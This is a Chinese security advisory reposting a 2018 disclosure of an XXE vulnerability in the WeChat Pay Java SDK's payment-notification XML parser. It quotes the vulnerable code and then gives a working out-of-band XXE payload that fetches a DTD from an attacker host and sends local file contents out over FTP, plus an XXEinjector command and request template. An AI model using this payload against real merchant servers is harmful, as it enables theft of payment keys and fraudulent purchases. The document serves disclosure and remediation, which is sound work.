# 漏洞预警 \| 微信支付SDK存在XXE漏洞

漏洞信息来源：  
[http://seclists.org/fulldisclosure/2018/Jul/3](http://seclists.org/fulldisclosure/2018/Jul/3)

> **受影响版本：**  
> JAVA SDK，WxPayAPI\_JAVA\_v3，建议使用了该版本的公司**进行异常支付排查**。

微信在JAVA版本的SDK中提供callback回调功能，用来帮助商家接收异步付款结果，该接口接受XML格式的数据，攻击者可以构造恶意的回调数据（XML格式）来窃取商家服务器上的任何信息。一旦攻击者获得了关键支付的安全密钥（md5-key和商家信息，将可以直接实现0元支付购买任何商品）

### 漏洞详情 <a id="toc-0"></a>

The SDK in this page: [https://pay.weixin.qq.com/wiki/doc/api/jsapi.php](https://pay.weixin.qq.com/wiki/doc/api/jsapi.php)

```text
chapter=11_1
   Just in java vision:
https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip
    or
https://drive.google.com/file/d/1AoxfkxD7Kokl0uqILaqTnGAXSUR1o6ud/view(
Backup ）


   README.md in  WxPayApi_JAVA_v3.zip,it show more details:

   notify code example:
    [
        String notifyData = "....";
        MyConfig config = new MyConfig();
        WXPay wxpay = new WXPay(config);
//conver to map
        Map<String, String> notifyMap = WXPayUtil.xmlToMap(notifyData);

        if (wxpay.isPayResultNotifySignatureValid(notifyMap)) {
//do business logic
        }
        else {
         }

     ]
    WXPayUtil source code
   [

  public static Map<String, String> xmlToMap(String strXML) throws
Exception {
    try {
            Map<String, String> data = new HashMap<String, String>();
            /*** not disabled xxe *****/
            //start parse

            DocumentBuilderFactory documentBuilderFactory =
DocumentBuilderFactory.newInstance();
            DocumentBuilder documentBuilder =
documentBuilderFactory.newDocumentBuilder();
            InputStream stream = new ByteArrayInputStream(strXML.getBytes(
"UTF-8"));
            org.w3c.dom.Document doc = documentBuilder.parse(stream);

           //end parse


            doc.getDocumentElement().normalize();
            NodeList nodeList = doc.getDocumentElement().getChildNodes();
            for (int idx = 0; idx <nodeList.getLength(); ++idx) {
                Node node = nodeList.item(idx);
                if (node.getNodeType() == Node.ELEMENT_NODE) {
                    org.w3c.dom.Element element = (org.w3c.dom.Element) node;
                    data.put(element.getNodeName(), element.getTextContent());
                }
            }
            try {
                stream.close();
            } catch (Exception ex) {
                // do nothing
            }
            return data;
        } catch (Exception ex) {
            WXPayUtil.getLogger().warn("Invalid XML, can not convert tomap. Error message: {}. XML content: {}", ex.getMessage(), strXML);
            throw ex;
        }
    }

]
```

### 利用细节 <a id="toc-1"></a>

```text
Post merchant notification url with  payload:
```

```text
<?xml version="1.0" encoding="utf-8"?>
<
!DOCTYPE root [  
<!ENTITY % attack SYSTEM "file:///etc/">
<!ENTITY % xxe SYSTEM "http://attacker:8080/shell/data.dtd";>
  %xxe;
]>

data.dtd:

<
!ENTITY % shell "
<
!ENTITY % upload SYSTEM 'ftp://attack:33/%attack;
'>">

%shell;
%upload;

or use  XXEinjector tool  【https://github.com/enjoiz/XXEinjector】

ruby XXEinjector.rb --host=attacker --path=/etc   --file=req.txt --ssl

req.txt :
POST merchant_notification_url HTTP/1.1
Host:  merchant_notification_url_host
User-Agent: curl/7.43.0
Accept: */*
Content-Length: 57
Content-Type: application/x-www-form-urlencoded

XXEINJECT


In order to prove this, I got 2 chinese famous company:
   a、momo: Well-known chat tools like WeChat
   b、vivo ：China's famous mobile phone,that also famous in my country
```

## [微信支付SDK漏洞排查修复札记](https://mp.weixin.qq.com/s/IMlqJjltFiPlCjj7P_65Ww) <a id="activity-name"></a>

